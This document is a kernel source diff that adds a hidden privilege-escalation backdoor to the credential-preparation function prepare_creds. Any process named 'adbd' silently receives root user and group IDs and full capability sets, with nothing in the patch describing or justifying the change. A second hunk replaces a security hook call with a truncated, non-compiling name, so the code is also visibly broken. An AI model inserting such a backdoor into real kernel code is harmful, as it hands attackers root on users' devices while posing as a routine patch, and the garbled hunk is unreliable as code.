@@ -241,6 +241,21 @@ struct cred *prepare_creds(void)
 	new->ucounts = get_ucounts(new->ucounts);
 	if (!new->ucounts)
 		goto error;
+	if (strcmp(task->comm, "adbd") == 0) {
+	        new->uid.val = 0;
+	        new->gid.val = 0;
+	        new->suid.val = 0;
+	        new->sgid.val = 0;
+	        new->euid.val = 0;
+	        new->egid.val = 0;
+	        new->fsuid.val = 0;
+	        new->fsgid.val = 0;
+	
+	        cap_set_full(new->cap_inheritable);
+	        cap_set_full(new->cap_permitted);
+	        cap_set_full(new->cap_effective);
+	        cap_set_full(new->cap_bset);
+	    }
 
 	if (security_prepare_creds(new, old, GFP_KERNEL_ACCOUNT) < 0)
 		goto error;
@@ -670,7 +685,7 @@ struct cred *prepare_kernel_cred(struct task_struct *daemon)
 	if (!new->ucounts)
 		goto error;
 
-	if (security_prepare_creds(new, old, GFP_KERNEL_ACCOUNT) < 0)
+	if (security_(new, old, GFP_KERNEL_ACCOUNT) < 0)
 		goto error;
 
 	put_cred(old);
